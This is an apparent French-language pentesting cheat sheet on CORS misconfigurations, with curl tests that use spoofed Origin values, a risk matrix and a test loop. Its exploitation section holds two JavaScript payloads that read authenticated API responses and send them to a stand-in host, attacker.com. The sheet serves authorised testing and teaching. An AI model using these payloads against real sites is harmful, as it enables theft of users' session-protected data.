# 🌍 Fiche pratique des mauvaises configurations CORS

<!-- language-home-navigation -->
[🏠 Accueil en français](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇮🇹 Versione Italiana](README.it.md) • [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
   ██████╗ ██████╗ ██████╗ ███████╗
  ██╔════╝██╔═══██╗██╔══██╗██╔════╝
  ██║     ██║   ██║██████╔╝███████╗
  ██║     ██║   ██║██╔══██╗╚════██║
  ╚██████╗╚██████╔╝██║  ██║███████║
   ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝
   Cross-Origin Resource Sharing
```

---

> **Portée des exemples :** CORS détermine surtout si le navigateur permet au script de lire une réponse entre origines ; ce n’est pas un contrôle d’autorisation côté serveur. Les mentions de gravité du tableau décrivent la source : l’impact dépend des données accessibles, des identifiants envoyés et du contexte d’attaque. Voir le [guide CORS de MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS).
>
> **Identifiants et vérification :** le navigateur refuse l’accès à une réponse avec identifiants lorsque `Access-Control-Allow-Origin` vaut `*`, même avec `Access-Control-Allow-Credentials: true` ; voir l’[explication officielle MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS/Errors/CORSNotSupportingCredentials). `curl -I` effectue une requête HEAD et n’applique pas les contrôles CORS du navigateur. Certaines requêtes nécessitent une pré-vérification (preflight), et les règles de cookies peuvent limiter l’envoi des identifiants. Les commandes, en-têtes, valeurs et scripts sources sont conservés ; un en-tête seul ne prouve pas l’exploitabilité. Le dessin ASCII conserve le texte source.

## 🎯 Qu’est-ce que CORS

**CORS** (Cross-Origin Resource Sharing, partage de ressources entre origines) contrôle quelles origines peuvent accéder aux ressources depuis un navigateur. Une mauvaise configuration peut permettre à un attaquant de lire des données sensibles depuis une autre origine.

---

## 🔍 Tester CORS

### Test élémentaire
```bash
curl -H "Origin: https://evil.com" -I https://target.com/api/user

# Examiner les en-têtes de réponse :
Access-Control-Allow-Origin: https://evil.com  # Vulnérable selon la source !
Access-Control-Allow-Credentials: true         # Risque accru selon la source !
```

### Valeurs de test pour l’en-tête Origin
```
# Contourner une vérification de correspondance exacte
https://evil.com
https://target.com.evil.com
https://eviltarget.com
https://target.com%60.evil.com

# Origine null
null

# Sous-domaine
https://sub.target.com

# Passage à un protocole non chiffré
http://target.com
```

---

## 💉 Exploitation

### Lire des données avec les identifiants de session
```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://vulnerable.com/api/user', true);
xhr.withCredentials = true;
xhr.onload = function() {
    // Envoyer les données à l’attaquant
    fetch('https://attacker.com/log?data=' + btoa(xhr.responseText));
};
xhr.send();
</script>
```

### Variante avec l’API Fetch
```html
<script>
fetch('https://vulnerable.com/api/sensitive', {
    credentials: 'include'
})
.then(r => r.text())
.then(d => {
    fetch('https://attacker.com/?data=' + btoa(d));
});
</script>
```

---

## 📊 Matrice des vulnérabilités

| En-tête ACAO | ACAC | Risque |
|-------------|------|------|
| `*` | false | Faible (sans identifiants) |
| `*` | true | Configuration non valide |
| Origine de l’attaquant | true | **CRITIQUE** |
| null | true | **ÉLEVÉ** |
| Origine reflétée | true | **CRITIQUE** |

### Configurations dangereuses
```http
# Reflète n’importe quelle origine
Access-Control-Allow-Origin: [request origin]
Access-Control-Allow-Credentials: true

# Autorise null
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

---

## 🛠️ Vérifications rapides

```bash
# Automatiser les vérifications avec curl
for origin in "https://evil.com" "null" "https://target.com.evil.com"; do
  echo "Testing: $origin"
  curl -sI -H "Origin: $origin" https://target.com/api | grep -i "access-control"
done
```

---

## 📚 Ressources

- [CORS — PortSwigger](https://portswigger.net/web-security/cors)
- [Fiche pratique d’exploitation CORS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration)

---

<p align="center">
  <b>🌍 Analysez les mauvaises configurations CORS !</b><br>
  <i>Uniquement dans le cadre de tests autorisés !</i>
</p>
